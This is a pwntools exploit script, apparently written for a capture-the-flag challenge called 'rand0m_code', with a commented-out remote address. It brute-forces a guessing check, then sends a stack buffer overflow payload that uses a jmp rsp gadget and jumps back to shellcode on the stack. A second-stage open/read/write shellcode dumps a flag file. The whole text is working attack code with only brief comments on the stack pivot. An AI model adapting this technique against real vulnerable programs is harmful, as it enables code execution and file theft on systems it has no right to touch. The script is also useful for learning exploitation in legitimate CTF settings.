from pwn import *
io=process('./rand0m_code')
# io=remote('47.92.27.98',26835)
context.log_level='debug'
context.arch='amd64'
raw_input()
 
 
jmp_rsp=0x40094e
mmap_place=0x601000
#place=0x601000
 
while(1):
    io.recvuntil("please input a guess num:\n")
    io.sendline("1")
    #io.recvline()
    a = io.recv(2)
    print(a)
    if(a == b'go'):
        success('good!!!')
        break
 
#sh3=asm(shellcraft.open('./flag.txt'))
sh3 =asm(shellcraft.open('./flag'))
sh3+=asm(shellcraft.read(3,mmap_place+0x300,0x100))#about that 0x300 you add anymore is not importance you just need to sure  mmap_place+x in vmmap around
sh3+=asm(shellcraft.write(1,mmap_place+0x300,0x100))
 
 
sh1=asm(shellcraft.read(0,mmap_place,500))+asm("mov rax,0x601000;call rax")
#gdb.attach(io,"b *0x400A49")
sh1=sh1.ljust(0x28,b'\x00')
sh1+=p64(jmp_rsp) # leave过后，rsp指到了 返回地址的地址
sh1+=asm("sub rsp,0x30;jmp rsp") # rsp - 0x30 才回到之前的栈帧这样就跳到写在栈上的sc了
io.recvuntil('your door') 
io.sendline(sh1)
 
sleep(1)
io.sendline(sh3)
 
io.interactive()
